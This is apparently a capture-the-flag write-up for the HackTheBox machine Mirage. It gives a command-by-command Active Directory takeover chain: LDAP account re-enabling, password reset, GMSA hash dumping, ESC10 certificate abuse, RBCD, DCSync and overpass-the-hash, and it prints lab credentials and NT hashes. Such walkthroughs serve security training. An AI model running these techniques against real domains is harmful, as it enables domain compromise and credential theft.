# HTB Mirage - Comprehensive Fast-Path Walkthrough

## Introduction & The Hacker Mindset
This walkthrough details the "fast path" to rooting the HackTheBox machine **Mirage**. In a real-world penetration test, we often assume a breach scenario where we already have a set of low-privileged credentials. 

**The Mirage Environment Quirks:**
1. **NTLM is disabled:** We cannot use standard Pass-the-Hash or simple NTLM authentication. We are forced to use **Kerberos** for everything.
2. **Aggressive Clock Skew:** Kerberos strictly requires the client and server clocks to be within 5 minutes of each other. Mirage has a severe, constantly drifting clock skew (roughly +7 hours), which forces us to use tools like `ntpdate` and `faketime` to successfully forge our Kerberos requests.

---

## Step 1: Environment Setup
**The Hacker Mindset:** Kerberos relies entirely on DNS resolution (not IP addresses) and time synchronization. Before we launch a single exploit, we must conform our attacking machine to the target's strict domain environment.

1. **Add DNS Records:**
   ```bash
   echo -e "10.129.232.163\tdc01.mirage.htb mirage.htb nats-svc.mirage.htb" | sudo tee -a /etc/hosts
   ```
2. **Sync the Clock:**
   ```bash
   sudo ntpdate 10.129.232.163
   ```
3. **Configure Kerberos (`custom_krb5.conf`):**
   We create a custom configuration file telling our Kali machine how to talk to the `MIRAGE.HTB` realm.
   ```bash
   cat << EOF > custom_krb5.conf
   [libdefaults]
       default_realm = MIRAGE.HTB
       dns_lookup_realm = true
       dns_lookup_kdc = true
   
   [realms]
       MIRAGE.HTB = {
           kdc = dc01.mirage.htb
           admin_server = dc01.mirage.htb
           default_domain = mirage.htb
       }
   
   [domain_realm]
       mirage.htb = MIRAGE.HTB
       .mirage.htb = MIRAGE.HTB
   EOF
   export KRB5_CONFIG="\$PWD/custom_krb5.conf"
   ```

---

## Step 2: Initial Access & The User Flag
**The Hacker Mindset:** We bypass initial reconnaissance (NFS shares, DNS spoofing, Kerberoasting) by leveraging known compromised credentials for the `nathan.aadam` account, which is part of the `IT_Admins` group (allowing WinRM access).

1. **Get a Ticket Granting Ticket (TGT):**
   ```bash
   kinit nathan.aadam
   # Password: 3edc#EDC3
   ```
2. **Log in via WinRM and grab the flag:**
   ```bash
   evil-winrm -i dc01.mirage.htb -r mirage.htb
   # Once in: type C:\Users\nathan.aadam\Desktop\user.txt
   ```

---

## Step 3: Pivoting & Re-enabling Javier's Account
**The Hacker Mindset:** We know `javier.mmarshall` has the rights to read the GMSA (Group Managed Service Account) password. However, his account is disabled. We also know we have the credentials for `mark.bbond` (`1day@atime`), who has the LDAP permissions to modify Javier's account. We will abuse these privileges to re-activate the account.

1. **Get a ticket for Mark:**
   ```bash
   unset KRB5CCNAME # Clear any impacket variables
   rm /tmp/krb5cc_1000 # Clear old native cache
   kinit mark.bbond
   # Password: 1day@atime
   ```
2. **Re-enable the account via LDAP (Remove the disabled flag):**
   ```bash
   ldapmodify -Q -Y GSSAPI -H ldap://dc01.mirage.htb << EOF
   dn: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
   changetype: modify
   replace: userAccountControl
   userAccountControl: 66048
   EOF
   ```
3. **Remove Logon Hours restrictions:**
   ```bash
   ldapmodify -Q -Y GSSAPI -H ldap://dc01.mirage.htb << EOF
   dn: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
   changetype: modify
   delete: logonHours
   EOF
   ```

---

## Step 4: Password Reset and Extracting the GMSA Hash
**The Hacker Mindset:** The account is active, but we don't know the current password. Since `mark.bbond` has the right to reset it, we force a password change. Once we control Javier's account, we can ask the Domain Controller for the `mirage-service$` password hash.

1. **Reset Javier's password:**
   ```bash
   net rpc user password 'javier.mmarshall' --use-kerberos=required -S dc01.mirage.htb
   # Set to something like: P@ssword123!26
   ```
2. **Sync time perfectly before using Impacket/NXC:**
   ```bash
   sudo ntpdate 10.129.232.163
   ```
3. **Dump the GMSA password hash:**
   *Note: From here on, we wrap Python/Impacket commands in `faketime "+7 hours"` because the underlying `minikerberos` library struggles with the target's aggressive clock skew.*
   ```bash
   faketime "+7 hours" nxc ldap dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'P@ssword123!26' -k --gmsa
   ```
   *Result: We get the NT Hash for `Mirage-Service$`: `baff1b1665492933d4fda9d8bc274738`*

---

## Step 5: Abusing ESC10 (Certificate Template Vulnerability)
**The Hacker Mindset:** We want to perform a DCSync attack, but `mirage-service$` doesn't have the rights. We find that `mirage-service$` has Write privileges over `mark.bbond`. We can modify Mark's User Principal Name (UPN) to pretend to be the Domain Controller (`dc01$@mirage.htb`), request a certificate as Mark (which the CA will issue for `dc01$`), and then use that certificate to authenticate as the Domain Controller itself.

1. **Get a ticket for the service account:**
   ```bash
   faketime "+7 hours" impacket-getTGT -hashes ':baff1b1665492933d4fda9d8bc274738' 'mirage.htb/mirage-service$'
   ```
2. **Spoof Mark's UPN to look like the DC:**
   ```bash
   KRB5CCNAME='mirage-service$.ccache' faketime "+7 hours" certipy-ad account update -k -no-pass -dc-host 'dc01.mirage.htb' -user 'mark.bbond' -upn 'dc01$@mirage.htb'
   ```
3. **Request a certificate as Mark (Ensure you still have Mark's native ticket in `/tmp/krb5cc_1000`):**
   ```bash
   KRB5CCNAME='/tmp/krb5cc_1000' faketime "+7 hours" certipy-ad req -k -no-pass -dc-host 'dc01.mirage.htb' -ca 'mirage-DC01-CA' -template 'User'
   ```
   *Result: Saves a highly privileged `dc01.pfx` file to disk.*
4. **Clean up (Revert Mark's UPN):**
   ```bash
   KRB5CCNAME='mirage-service$.ccache' faketime "+7 hours" certipy-ad account update -k -no-pass -dc-host 'dc01.mirage.htb' -user 'mark.bbond' -upn 'mark.bbond@mirage.htb'
   ```

---

## Step 6: Resource-Based Constrained Delegation (RBCD)
**The Hacker Mindset:** Active Directory allows computer accounts to decide who is allowed to delegate to them. Since we possess a certificate proving we *are* the Domain Controller (`dc01$`), we can log in and tell the DC: "Allow `mirage-service$` to act on behalf of any user."

1. **Open an LDAP shell as the DC:**
   ```bash
   faketime "+7 hours" certipy-ad auth -pfx dc01.pfx -dc-ip '10.129.232.163' -ldap-shell
   ```
2. **Grant the RBCD rights to the service account:**
   ```text
   # set_rbcd dc01$ mirage-service$
   # exit
   ```

---

## Step 7: DCSync Attack
**The Hacker Mindset:** We gave `mirage-service$` the power to impersonate anyone to the DC. We will now request a Service Ticket impersonating the DC itself (`dc01$`), and then use that ticket to ask the Domain Controller to replicate its Active Directory database to us (DCSync), yielding the Domain Admin hash.

1. **Request the Impersonation Ticket:**
   ```bash
   KRB5CCNAME='mirage-service$.ccache' faketime "+7 hours" impacket-getST -k -no-pass -spn 'cifs/dc01.mirage.htb' -impersonate 'dc01$' 'mirage.htb/mirage-service$'
   ```
2. **Dump the Administrator Hash:**
   ```bash
   KRB5CCNAME='dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache' faketime "+7 hours" impacket-secretsdump -k -no-pass 'mirage.htb/dc01$'@dc01.mirage.htb -just-dc-user Administrator
   ```
   *Result: We get the Administrator NT Hash: `7be6d4f3c2b9c0e3560f5a29eeb1afb3`*

---

## Step 8: The Root Flag (Overpass-the-Hash)
**The Hacker Mindset:** We have the Domain Admin hash, but NTLM is disabled, so traditional Pass-the-Hash fails. We must perform "Overpass-the-Hash"—using the NT hash to request a valid Kerberos TGT from the KDC. Finally, we use WMI to remotely execute commands on the DC to grab the flag.

1. **Convert the Hash to a Kerberos Ticket:**
   ```bash
   faketime "+7 hours" impacket-getTGT -hashes ':7be6d4f3c2b9c0e3560f5a29eeb1afb3' 'mirage.htb/Administrator'
   ```
2. **Export the ticket to our environment:**
   ```bash
   export KRB5CCNAME="$PWD/Administrator.ccache"
   ```
3. **Log in as Administrator via WMIExec (Bypassing WinRM clock skew issues):**
   ```bash
   faketime "+7 hours" impacket-wmiexec -k -no-pass dc01.mirage.htb
   ```
4. **Grab the Root Flag!**
   ```cmd
   type C:\Users\Administrator\Desktop\root.txt
   ```

**Machine Rooted!**
